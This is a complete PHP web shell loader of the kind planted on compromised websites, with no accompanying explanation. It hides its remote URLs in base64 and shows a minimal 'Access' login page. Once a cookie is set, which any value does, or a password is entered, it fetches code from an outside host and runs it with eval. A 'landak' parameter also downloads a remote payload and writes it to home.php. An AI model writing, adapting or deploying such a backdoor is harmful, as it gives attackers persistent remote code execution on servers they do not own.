<?php

error_reporting(0);

/* ===============================

   CONFIG

================================ */

define('LOGIN_HASH', '$2a$12$jhSv26o43plVl1Yt3Msx.OsKzSWwYoAxEzbTf2rPlvBVaAj0SRa8G');

define('LOGIN_COOKIE', 'shadow_gate');

define('LOGIN_EXPIRY', 3600);

/* ===============================

   FETCH CORE (PHP 5 SAFE)

================================ */

function fetch_url($u) {

    // curl

    if (function_exists('curl_init')) {

        $c = curl_init($u);

        curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);

        curl_setopt($c, CURLOPT_SSL_VERIFYPEER, 0);

        $r = curl_exec($c);

        curl_close($c);

        if ($r !== false) return $r;

    }

    // fopen

    if (ini_get('allow_url_fopen')) {

        $r = @file_get_contents($u);

        if ($r !== false) return $r;

    }

    // fsockopen

    $p = parse_url($u);

    if (!isset($p['host'])) return false;

    $scheme = isset($p['scheme']) ? $p['scheme'] : 'http';

    $port   = ($scheme === 'https') ? 443 : 80;

    $path = isset($p['path']) ? $p['path'] : '/';

    if (isset($p['query'])) $path .= '?' . $p['query'];

    $fp = @fsockopen(($scheme === 'https' ? 'ssl://' : '') . $p['host'], $port, $e, $s, 5);

    if (!$fp) return false;

    fwrite($fp,

        "GET $path HTTP/1.0\r\n" .

        "Host: {$p['host']}\r\n" .

        "Connection: Close\r\n\r\n"

    );

    $res = '';

    while (!feof($fp)) $res .= fgets($fp, 1024);

    fclose($fp);

    $pos = strpos($res, "\r\n\r\n");

    return ($pos !== false) ? substr($res, $pos + 4) : false;

}

/* ===============================

   HELPERS

================================ */

function d64($s) { return base64_decode($s); }

function save($f, $c) { @file_put_contents($f, $c); }

/* ===============================

   LOGIN PAGE (MINIMAL)

================================ */

function render_login($q) {

echo '<!doctype html>

<html>

<head>

<meta charset="utf-8">

<title>Access</title>

<style>

body{margin:0;background:#0b0b14;color:#fff;font-family:sans-serif;display:flex;align-items:center;justify-content:center;height:100vh}

.box{background:rgba(255,255,255,.05);padding:30px;border-radius:12px;width:320px;text-align:center}

input{width:100%;padding:12px;border:0;border-radius:8px;margin:15px 0}

button{padding:12px;width:100%;border:0;border-radius:8px;background:#6a00ff;color:#fff}

small{opacity:.7}

</style>

</head>

<body>

<div class="box">

<small>'.htmlspecialchars($q).'</small>

<form method="post">

<input type="password" name="password" placeholder="password">

<button>enter</button>

</form>

</div>

</body>

</html>';

}

/* ===============================

   AUTH + EXEC

================================ */

function auth_run($u) {

    if (isset($_COOKIE[LOGIN_COOKIE])) {

        eval("?>".fetch_url($u));

        exit;

    }

    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['password'])) {

        if (crypt($_POST['password'], LOGIN_HASH) === LOGIN_HASH) {

            setcookie(LOGIN_COOKIE, '1', time()+LOGIN_EXPIRY, '/');

            eVal("?>".fetch_url($u));

            exit;

        }

    }

    render_login("Silence is also an answer.");

    exit;

}

/* ===============================

   LANDING MODES

================================ */

if (isset($_GET['landak'])) {

    $u = d64('aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3LzBnaVk3S3RI');

    $c = fetch_url($u);

    if ($c) save('home.php', $c);

    echo 'done';

    exit;

}

/* ===============================

   DEFAULT

================================ */

$u = d64(

    'aHR0cHM6Ly9wZW5nb2Nva2hhbmRhbC5wYWdlcy5kZXYvbGFuZGFrX2FsZmEudHh0'

);

auth_run($u);
